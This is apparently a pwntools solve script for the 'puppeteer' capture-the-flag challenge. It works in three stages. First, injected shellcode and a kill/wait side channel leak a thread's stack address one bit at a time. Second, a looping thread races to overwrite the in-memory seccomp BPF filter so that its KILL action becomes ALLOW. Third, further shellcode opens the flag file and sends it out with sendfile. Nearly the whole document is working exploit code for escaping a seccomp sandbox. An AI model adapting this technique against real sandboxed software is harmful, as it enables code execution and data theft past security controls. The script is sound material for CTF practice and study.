#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./puppeteer_patched")
libc = ELF("./libc_chall.so.6", checksec = False)
ld = ELF("./ld-linux-x86-64.so.2", checksec = False)

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("puppeteer.challs.cyberchallenge.it", 37002)

    return r


def leak_thread_stack() -> int:
    # Progress bar for fancy output :)
    p = log.progress("Leaking first thread's stack address")

    # We know the last 8 bits of thread's stack address
    thread_stack = 0x690000000000

    # mmap() allocated memory isn't deallocated after the thread finishes.
    # Moreover the program mmap's memory (for code and stack) only if the slot for
    # the current thread hasn't already an mmap'ed memory.
    # This means that we can reuse both code and stack memory and leak them with
    # the combination of following shellcode and the program's menu option "kill".
    # Since we need the thread's stack to overwrite BPF filter, we can ignore code
    # address.
    for posix in range(40):
        p.status("%#x", thread_stack)

        shellcode = asm(f"""
                        bt rsp, {posix};
                        jnc loop;
                        ret;

                        loop:
                            jmp loop;
                    """)

        r.sendlineafter(b"> ", b"new")
        r.sendlineafter(b'newline:\n', shellcode.hex().encode())

        # A short sleep to let shellcode be created and run entirely
        sleep(0.2)

        # Kill the thread and "wait" to free the spot in the list
        r.sendlineafter(b"> ", b"kill 1")
        output = r.recvline()
        r.sendlineafter(b'> ', b"wait 1")

        bit = 1 if b"already exited" in output else 0
        thread_stack |= (bit << posix)

    p.success('%#x', thread_stack)
    return thread_stack


def overwrite_filter(bpf_filter: int):
    dummy = asm("nop;")     # Dummy shellcode to occupy the first location

    # This shellcode actively changes the BPF filter. Once we're done we can kill it
    shellcode = asm(f"""
                    movabs r15, {bpf_filter};

                    loop:
                        mov dword ptr [r15], 0x7fff0000;
                        jmp loop;
                """)

    r.sendlineafter(b"> ", b"new")
    r.sendlineafter(b'newline:\n', dummy.hex().encode())

    r.sendlineafter(b"> ", b"new")
    r.sendlineafter(b'newline:\n', shellcode.hex().encode())


def read_flag():
    shellcode = asm("""
                    /*
                        Since the stub always performs a jump to the beginning of the
                        shellcode, we have to differentiate which state we're currently
                        in to jump to the next correct instruction (the following it's
                        basically a switch-case code in C).
                        Also, all registers are zeroed so r14 is 0 at the beginning.
                    */
                    cmp r14, 1;
                    je sendfile;
                    cmp r14, 2;
                    je exit;

                    /* Get address of syscall which is in the stub before shellcode */
                    pop r15;
                    push r15;
                    add r15, 0x8;

                open:
                    /* Open the file */
                    mov rax, 2;
                    lea rdi, qword ptr [rip + flag];
                    xor rsi, rsi;
                    add r14, 1;
                    jmp r15;

                sendfile:
                    /*
                        Read from the file and write to stdout using sendfile.
                        It's also more efficient than the combination of read + write
                    */
                    mov rdi, 1;
                    mov rsi, rax;
                    xor rdx, rdx;
                    mov r10, 0x100;
                    mov rax, 40;
                    add r14, 1;
                    jmp r15;

                exit:
                    ret;

                flag:
                    .asciz "flag";
                    """)

    r.sendlineafter(b"> ", b"kill 1")
    r.sendlineafter(b"> ", b"wait 1")

    r.sendlineafter(b"> ", b"new")
    r.sendlineafter(b'newline:\n', shellcode.hex().encode())


# Not useful for the challenge but it's interesting
# https://en.wikipedia.org/wiki/Transactional_Synchronization_Extensions
# https://github.com/IAIK/armageddon/tree/master/libflush
def main():
    r = conn()

    thread_stack = leak_thread_stack()
    bpf_filter = thread_stack + 0x18 + 0x24     # Filter starts at $rsp+0x10; +0x8 because of seccomp_filter_len

    # NOTE: with regard to the output from `seccomp-tools dump ./puppeteer`, in memory the filter is stored as:
    #       CODE (1B) + 0x00 (1B) + JT (1B) + JF (1B) + K (4B).     The total is 8B
    # 
    # >  line  CODE  JT   JF      K
    # =================================
    # 0000: 0x20 0x00 0x00 0x00000004  A = arch
    # 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004
    # 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
    # 0003: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0005
    # 0004: 0x06 0x00 0x00 0x00000000  return KILL
    # 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
    #
    # We can, now, proceed to overwrite the filter with a looping thread that write at address `bpf_filter` so
    # that the "return KILL" will instead become SECCOMP_RET_ALLOW (so K will be 0x7fff0000)

    overwrite_filter(bpf_filter)
    read_flag()     # NOTE: Sometimes it might not win the race condition. Just re-run the entire script again

    r.interactive('$ ')


if __name__ == "__main__":
    main()
